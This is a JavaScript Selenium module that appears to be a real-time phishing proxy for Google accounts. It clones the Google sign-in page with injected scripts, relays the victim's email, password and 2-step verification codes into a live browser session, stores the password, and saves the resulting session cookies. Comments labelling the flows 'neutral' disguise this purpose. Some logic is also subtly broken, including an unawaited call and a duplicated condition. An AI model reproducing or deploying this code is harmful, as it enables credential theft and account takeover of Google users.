import fs from "fs";
import path from "path";
import { Builder, By, until } from "selenium-webdriver";
import chrome from "selenium-webdriver/chrome.js";
import psList from "ps-list";

import {
  addFunctionsScript,
  addSetInputEmailValueScript,
  addTimeoutScript,
  ensureUserLogDir,
  getSpecificTagList,
  removeSpecificTag,
  setFavicon,
  setForwardUrlScript,
  setUserIdScript,
  sleep,
  writeDebugLogLine,
  writeUserLog,
} from "./helpers.js";
import {
  activateUserWindowByPid,
  setActiveChromeWindow,
  UsersDB,
} from "./common.js";

const JTS_TEST_MODE = 1;

export const URL_DONE = "https://myaccount.google.com";
export const URL_GOOGLE_ACCOUNT_URL = "https://accounts.google.com";
export const URL_INPUT_EMAIL =
  "https://accounts.google.com/v3/signin/identifier";
export const URL_INPUT_PASSWORD =
  "https://accounts.google.com/v3/signin/challenge/pwd";
export const URL_RECAPTCHA = "";

export const URL_2_STEP_CHALLENGE_SELECTION =
  "https://accounts.google.com/v3/signin/challenge/selection";

export const URL_2_STEP_IPE =
  "https://accounts.google.com/v3/signin/challenge/ipe/verify";
export const URL_2_STEP_TOTP =
  "https://accounts.google.com/v3/signin/challenge/totp";
export const URL_2_STEP_OOTP =
  "https://accounts.google.com/v3/signin/challenge/ootp";
export const URL_2_STEP_DP =
  "https://accounts.google.com/v3/signin/challenge/dp";
export const URL_2_STEP_DP_PRESEND =
  "https://accounts.google.com/v3/signin/challenge/dp/presend";
export const URL_2_STEP_IPP_COLLECT =
  "https://accounts.google.com/v3/signin/challenge/ipp/collect";
export const URL_2_STEP_IPP_VERIFY =
  "https://accounts.google.com/v3/signin/challenge/ipp/verify";
export const URL_2_STEP_BC =
  "https://accounts.google.com/v3/signin/challenge/bc";
export const URL_2_STEP_PASSKEY =
  "https://accounts.google.com/v3/signin/challenge/pk/presend";

export const URL_2_STEP_HELP =
  "https://accounts.google.com/v3/signin/challenge/rejected";
// export const URL_RECOVERY_OPTION = 'https://gds.google.com/web/recoveryoptions'
export const URL_REJECTED = "https://accounts.google.com/v3/signin/rejected";
// export const URL_HOMEADDR = 'https://gds.google.com/web/homeaddress'
export const URL_RECOVERY_OPTION = "https://gds.google.com";

export const URL_MAIL_INBOX = "https://mail.google.com/mail/u/0/#inbox";
export const URL_MAIL_TRASH = "https://mail.google.com/mail/u/0/#trash";
export const URL_ACCOUNT_SECURITY = "https://myaccount.google.com/security";
export const URL_NOTIFICATIONS = "https://myaccount.google.com/notifications";
export const URL_AUTHENTICATOR =
  "https://myaccount.google.com/two-step-verification/authenticator";
export const URL_BACKUPCODES =
  "https://myaccount.google.com/two-step-verification/backup-codes";
export const URL_SIGNIN_TO_CHROME =
  "chrome://signin-dice-web-intercept.top-chrome/chrome-signin";

export const URL_CHROME_EXTENSION_AUTHENTICATOR =
  "chrome-extension://bhghoamapcdpbohphigoooaddinpkbai/view/popup.html";

async function buildChrome(userId, headless = false) {
  const opts = new chrome.Options();

  opts.addArguments(
    "--no-sandbox",
    // "--disable-gpu",
    "--fast-start",
    "--disable-features=UserAgentClientHint"
  );

  opts.debuggerAddress(`127.0.0.1:${userId}`);
  if (headless) {
    if (opts.headless) {
      // opts.headless();
    } else {
      // opts.addArguments("--headless=new");
    }
  }
  return await new Builder()
    .forBrowser("chrome")
    .setChromeOptions(opts)
    .build();
}

// ----------------- Utilities (neutral) -----------------
export async function waitForPageLoading(driver) {
  try {
    // wait DOM ready, then complete
    await driver.wait(
      async () =>
        (await driver.executeScript("return document.readyState")) ===
          "interactive" ||
        (await driver.executeScript("return document.readyState")) ===
          "complete",
      10000
    );
    await driver.wait(
      async () =>
        (await driver.executeScript("return document.readyState")) ===
        "complete",
      10000
    );
    return true;
  } catch {
    return false;
  }
}

export async function findTab(driver, urlPrefix) {
  // Selenium doesn’t enumerate tabs’ URLs without switching; we’ll sample handles
  const handles = await driver.getAllWindowHandles();
  let productURL = "";
  for (const hndle of handles) {
    await driver.switchTo().window(hndle);
    const curURL = await driver.getCurrentUrl();
    console.log("[curURL]", curURL, urlPrefix);
    if (curURL.startsWith(urlPrefix)) {
      productURL = curURL;
      break;
    }
  }
  return productURL;
}

export async function findTabExceptChromeNotice(driver) {
  const handles = await driver.getAllWindowHandles();
  // Close chrome-extension:// tabs if visible (best-effort)
  for (const h of handles) {
    await driver.switchTo().window(h);
    const u = await driver.getCurrentUrl().catch(() => "");
    if (u.startsWith("chrome-extension://")) {
      try {
        await driver.close();
      } catch {}
    }
  }
  const rest = await driver.getAllWindowHandles();
  let product_url = "";
  for (const h of rest) {
    await driver.switchTo().window(h);
    const u = await driver.getCurrentUrl().catch(() => "");
    if (!u.startsWith("chrome://")) {
      product_url = u;
      break;
    }
  }
  return [driver, product_url];
}

export async function waitChangedUrl(driver, oldurl /* , chkparam */) {
  const base = (u) => (u.includes("?") ? u.slice(0, u.indexOf("?")) : u);
  const target = base(oldurl);
  let validation = false;
  for (let i = 0; i < 20; i++) {
    await sleep(300);
    const cur = await driver.getCurrentUrl();
    if (base(cur) !== target) {
      validation = await waitForPageLoading(driver);
      break;
    }
  }
  const newURL = await driver.getCurrentUrl();
  return { newURL, validation };
}

export async function openNewTabWithUrl(driver, url) {
  // Selenium: open new tab via window.open(), then switch
  await driver.executeScript("window.open(arguments[0], '_blank');", url);
  const handles = await driver.getAllWindowHandles();
  await driver.switchTo().window(handles[handles.length - 1]);
  const new_url = await driver.getCurrentUrl();
  await driver.wait(until.urlIs(new_url), 10000);
  return [driver, new_url];
}

// ----------------- Page HTML snapshot (sanitized) -----------------
export async function getPageSource(userId) {
  // try {
  const { driver } = await UsersDB.get(userId);
  if (!driver) {
    console.log("Driver data is not working");
    return "";
  }

  // wait page loading // (until to language setting button clickable)
  await driver.wait(
    until.elementIsEnabled(
      driver.findElement(By.xpath('//div[@jsname="oYxtQd"]'))
    )
  );

  // wait page loading (until to jsname="USBQqe")
  while (true) {
    const div_USBQqe_s = await driver.findElements(
      By.xpath('//div[@jsname="USBQqe"]')
    );
    if (div_USBQqe_s.length == 1) {
      break;
    }
    await sleep(100);
  }
  //

  // Input tag: set badinput="true" attribute
  const inputElements = await driver.findElements(By.xpath("//input"));

  for (const element of inputElements) {
    try {
      const typeAttribute = await element.getAttribute("type");
      if (typeAttribute === "hidden") {
        continue;
      }

      // Set badinput attribute using JavaScript
      await driver.executeScript(
        "arguments[0].setAttribute('badinput', arguments[1]);",
        element,
        "true"
      );
    } catch (error) {
      console.log(`Error setting attribute on input: ${error.message}`);
    }
  }

  // Get HTML from specific div
  const divElements = await driver.findElements(By.xpath('//*[@id="yDmH0d"]'));
  if (divElements.length === 0) {
    throw new Error('Element with id "yDmH0d" not found');
  }

  const divEl = divElements[0];
  let htmlYDmH0d = await divEl.getAttribute("innerHTML");

  // Remove script and iframe tags
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");

  // Add styles
  const pageSource = await driver.getPageSource();
  const styleList = getSpecificTagList(pageSource, "style");

  for (let i = 0; i < styleList.length; i++) {
    htmlYDmH0d += styleList[i];
  }

  return htmlYDmH0d;
  // } catch (error) {
  //    console.log(`getPageSource: ${error.message}`);
  //   return "";
  // }
}

export async function saveScreenshot(driver, userId, screenshotName) {
  try {
    if (!driver) return;
    const scrnShotData = await driver.takeScreenshot();
    const userDir = ensureUserLogDir(userId);
    const screenShotPath = path.join(userDir, screenshotName);
    // Save to file
    fs.writeFileSync(screenShotPath, scrnShotData, "base64");
    return true;
  } catch (error) {
    return false;
  }
}
// ----------------- High-level flows (neutral) -----------------
export async function scrapingReady(
  userId,
  email,
  lang,
  { forwardURL, userAgent, newUserFlg = true }
) {
  writeUserLog(userId, `Scraping Ready : ${email} ${lang} ${forwardURL}`);
  let pid = -1;
  let driver = null;
  if (newUserFlg || JTS_TEST_MODE) {
    pid = await setActiveChromeWindow(userId);
    writeUserLog(userId, `chrome created : pid=${pid}`);
    driver = await buildChrome(userId, true);
    await UsersDB.set(userId, {
      userId,
      driver,
      startedAt: Date.now(),
      email,
      pid,
    });
  } else {
    const user = await UsersDB.get(userId);
    console.log(`userdata = ${JSON.stringify(user, null, 2)}`);
    if (!user) {
      throw new Error("Parameter is incorrect");
    }
    pid = user["pid"];
    writeUserLog(userId, `chrome ${user} => activated ${pid}`);
    await activateUserWindowByPid(userId, pid);
  }

  if (!driver || pid < 0) {
    throw new Error("Parameter is incorrect");
  }
  await saveScreenshot(driver, userId, "scraping_ready_0.png");

  let productURL = findTab(driver, URL_GOOGLE_ACCOUNT_URL);

  if (!productURL) {
    writeUserLog(userId, `not_found_url = ${URL_GOOGLE_ACCOUNT_URL}`);
    await driver.get(URL_GOOGLE_ACCOUNT_URL);
    await waitForPageLoading(driver);
    productURL = driver.getCurrentUrl();
    // await driver.wait.until(until.urlIs(productURL));
  }
  await saveScreenshot(driver, userId, "scraping_ready_1.png");

  const strXPath = '//input[@id="identifierId"]';

  // Wait until element is clickable (same as EC.element_to_be_clickable)
  const inputElement = await driver.wait(
    until.elementIsVisible(
      await driver.wait(until.elementLocated(By.xpath(strXPath)), 15000)
    ),
    15000
  );

  // Click, clear, type
  await inputElement.click();
  await inputElement.clear();
  await inputElement.sendKeys(email);

  const pageSource = await driver.getPageSource();
  // Snapshot sanitized HTML (no scripts/iframes)
  writeDebugLogLine(`[pageSource] ${pageSource}`);

  // remove script
  let htmlText = removeSpecificTag(pageSource, "script");
  htmlText = removeSpecificTag(htmlText, "iframe");
  // change style
  let styleList = getSpecificTagList(pageSource, "style");
  htmlText = removeSpecificTag(htmlText, "style");

  let divEl = await driver.findElement(By.id("yDmH0d"));
  if (!divEl) {
    return "";
  }
  let htmlYDmH0d = await divEl.getAttribute("innerHTML");
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");
  let htmlChange = htmlYDmH0d;
  for (let i = 0; i < styleList.length; i++) {
    htmlChange += styleList[i];
  }

  // replace
  htmlChange = addSetInputEmailValueScript(htmlChange, email);
  htmlText = htmlText.replace(htmlYDmH0d, htmlChange);
  // add script
  htmlText = setUserIdScript(htmlText, userId);

  htmlText = setForwardUrlScript(htmlText, forwardURL);
  htmlText = addFunctionsScript(htmlText);
  htmlText = addTimeoutScript(htmlText);
  htmlText = setFavicon(htmlText);

  return htmlText;
}

export async function scrapInputValueAndBtnNext(
  userId,
  inputValue,
  btnType,
  btnText
) {
  const user = await UsersDB.get(userId);
  const { driver, pid } = user;
  await activateUserWindowByPid(userId, pid);
  writeUserLog(
    userId,
    `scrapInputValueAndBtnNext : ${inputValue} / ${btnType} / ${btnText}`
  );
  await saveScreenshot(driver, userId, "btn_action_0.png");
  let productURL = await findTab(driver, URL_GOOGLE_ACCOUNT_URL);
  if (!productURL) return;
  console.log(`[productURL]: ${JSON.stringify(productURL)}`);

  if (productURL.startsWith(URL_INPUT_EMAIL)) {
    await UsersDB.updateDetail(userId, "email", inputValue);
  } else if (productURL.startsWith(URL_INPUT_EMAIL)) {
    await UsersDB.updateDetail(userId, "PWD", inputValue);
  }

  await saveScreenshot(driver, userId, "btn_action_1.png");

  if (btnType == 0) {
    if (productURL.startsWith(URL_INPUT_EMAIL)) {
      writeUserLog(
        userId,
        `scrapInputValueAndBtnNext : input email : ${inputValue}`
      );
      let emailInput = await driver.wait(
        until.elementIsEnabled(driver.findElement(By.id("identifierId")))
      );

      await emailInput.click();
      await emailInput.clear();
      await emailInput.sendKeys(inputValue);
      // write_log(user_id, f'email has been entered.')
    } else if (productURL.startsWith(URL_INPUT_PASSWORD)) {
      let passwordInput = await driver.wait(
        until.elementIsEnabled(
          driver.findElement(By.xpath('//input[@name="Passwd"]'))
        )
      );
      await passwordInput.click();
      await passwordInput.clear();
      await passwordInput.sendKeys(inputValue);
    } else if (inputValue.length > 0) {
      const elements = await driver.findElements(By.xpath("//input"));
      for (const inputEl of elements) {
        const inputType = await inputEl.getAttribute("type");
        if (
          inputType == "hidden" ||
          inputType == "checkbox" ||
          inputType == "button"
        )
          continue;
        inputEl.clear();
        inputEl.sendKeys(inputValue);
        writeUserLog(userId, `input value has been entered.`);
      }
    }
    let buttons = await driver.findElements(By.tagName("button"));
    console.log(`Found ${buttons.length} buttons`);

    for (let i = 0; i < buttons.length; i++) {
      try {
        const mBtnText = await buttons[i].getText();

        console.log("[findElements]", btnText, mBtnText);
        if (mBtnText == btnText) {
          await buttons[i].click();
          console.log(`Clicked button ${i + 1}`);
          // Add small delay between clicks if needed
          await driver.sleep(200);
        }
      } catch (error) {
        console.log(`Could not click button ${i + 1}: ${error.message}`);
      }
    }
  } else if (btnType == 1) {
    await driver
      .wait(
        until.elementIsEnabled(
          driver.findElement(By.xpath(`//div[@jsname="${btnText}"]`))
        )
      )
      .click();
    writeUserLog(userId, `Re-select account button has been clicked.`);
  } else if (btnType == 2) {
    const elements = await driver.findElements(By.xpath(`//li`));
    for (const element of elements) {
      const className = await element.getAttribute("class");
      console.log("[className]", className);
      if (className.indexOf("aZvCDf cd29Sd zpCp3 SmR8") < 0) continue;
      const eleText = await element.getText();
      if (eleText.indexOf(btnText) >= 0) {
        await element.click();
        writeUserLog(
          userId,
          `Try-another-way-item has been clicked. ${btnText}`
        );
      }
    }
  }

  const { newURL, validation } = await waitChangedUrl(driver, productURL);
  writeUserLog(userId, `scrap_input_value_and_btn_next : new-url=${newURL}`);
  saveScreenshot(driver, userId, "btn_action_2.png");
  if (!validation) {
    return {
      status: 0,
      curPage: "",
    };
  }
  let curPage = "";

  if (newURL.startsWith(URL_DONE) || newURL.startsWith(URL_RECOVERY_OPTION)) {
    return { status: 1, curPage: "done" };
  }

  if (newURL.startsWith(URL_INPUT_EMAIL)) {
    curPage = "email";
  } else if (newURL.startsWith(URL_INPUT_PASSWORD)) {
    curPage = "password";
  } else if (newURL.startsWith(URL_2_STEP_DP_PRESEND)) {
    curPage = "dp-presend";
  } else if (newURL.startsWith(URL_2_STEP_DP)) {
    curPage = "dp";
  }
  const htmlText = await getPageSource(userId);

  return { status: 1, htmlText, curPage };
}

export async function scrapCheckURL(userId) {
  writeUserLog(userId, "scrapCheckURL");
  const ctx = await UsersDB.get(userId);
  if (!ctx) return { status: 0 };

  const { driver } = ctx;
  const url = await driver.getCurrentUrl();
  const html = await getPageSource(userId);
  return { status: 1, curPage: "", url, htmlText: html };
}

export async function saveScrapingResultAndSetDone(userId) {
  writeUserLog(userId, "saveScrapingResultAndSetDone");
  const ctx = await UsersDB.get(userId);
  if (!ctx) return { status: 0 };
  const { driver } = ctx;

  // Save cookies for domains you own/control if needed
  try {
    const cookies = await driver.manage().getCookies();
    const dir = ensureUserLogDir(userId);
    fs.writeFileSync(
      path.join(dir, "cookies.json"),
      JSON.stringify(cookies, null, 2)
    );
    writeUserLog(userId, "cookies saved");
  } catch {
    writeUserLog(userId, "cookies read failed");
  }

  try {
    await driver.quit();
  } catch {}
  await UsersDB.remove(userId);
  writeUserLog(userId, "driver closed");
  return { status: 1 };
}
/**
 * Check if a process with a given PID and name (e.g. "chrome") is running
 * @param {number} pid - process id to check
 * @param {string} name - process name ("chrome", "google-chrome", etc.)
 * @returns {Promise<boolean>}
 */

export async function checkProcessIsRunning(pid, name = "chrome") {
  try {
    const processes = await psList();

    return processes.some(
      (p) => p.pid === pid && p.name.toLowerCase().includes(name.toLowerCase())
    );
  } catch (err) {
    console.error("Error checking processes:", err);
    return false;
  }
}
